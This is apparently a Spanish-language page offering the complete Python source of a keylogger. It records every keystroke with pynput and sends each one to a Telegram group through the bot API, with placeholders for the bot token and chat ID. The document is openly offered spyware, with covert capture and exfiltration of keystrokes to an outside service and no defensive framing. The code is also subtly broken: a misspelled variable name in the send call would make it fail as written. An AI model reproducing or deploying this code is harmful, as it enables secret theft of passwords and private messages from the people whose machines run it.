-- -
# Código:

```Python
# Keylogger por Software by Cyb3rPh4nt0n:
# - Registro de pulsaciones.
# - Envío de pulsaciones a un grupo de Telegram.

import requests
from pynput import keyboard as kb

TOKEN_BOT = "TOKEN DEL BOT DE TG"
CHAT_ID = "ID DEL GRUPO DE TG" # Es un número negativo (no utilizar las comillas)

def enviar_mensaje_telegram(token, chat_id, mensaje):
	# Enciar las pulsaciones de teclado al grupo de forma automática
	url = f"https://api.telegram.org/bot{token}/sendMessage"
	
	# Datos para el envío
	payload = {
		"chat_id": chat_id,
		"text": mensaje,
		"parse_mode": "Markdown"
	}
	
	try:
		# Petición POST invisible
		response = requests.post(url, json=payload)
		
		# Comprobar si Telegram devolvío un error
		response.raise_for_status()
		
		#print("¡Mensaje enviado exitosamente!)
		return True
	
	except requests.exceptions.HTTPError as http_err:
		print(f"Error de Telegram: {response.text}")
		return False
	except requests.exceptions.RequestException as e:
		print(f"Error de conexión a la red: {e}")
		return False

# Función del Keylogger + envío
def detect_k(key):
	TEXTO_MENSAJE = f"[+] Tecla pulsada -> {str(key)}\n"
	enviar_mensaje_telegram(TOKEN_BOT, CHAT_ID, TEXTO_MESAJE)

if __name__ == "__main__":
	# Escuchar las pulsaciones
	kb.Listener(detect_k).run()
```